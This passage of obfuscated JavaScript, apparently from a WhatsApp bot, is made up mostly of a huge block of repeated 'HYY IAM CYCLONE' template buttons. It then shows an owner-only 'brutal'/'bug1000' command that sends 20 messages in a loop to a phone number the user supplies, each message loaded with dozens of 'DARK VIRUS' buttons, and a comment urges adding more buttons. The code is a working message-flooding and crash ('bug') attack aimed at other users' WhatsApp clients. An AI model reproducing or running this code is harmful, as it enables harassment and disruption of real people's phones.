9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quoted':lep}]});}}
await sleep(ms(waktu))
break

case '🌷':
case 'brutal':
case 'bug1000':
         if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
        txts = `SUCCES ✅`
        diablobotwhatsapp.reply(txts)
        
    
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '20'
        waktu = `5s`
    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
/* templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
,*/
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(num, {
text: 'BUG BY DANI', 
templateButtons: [
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
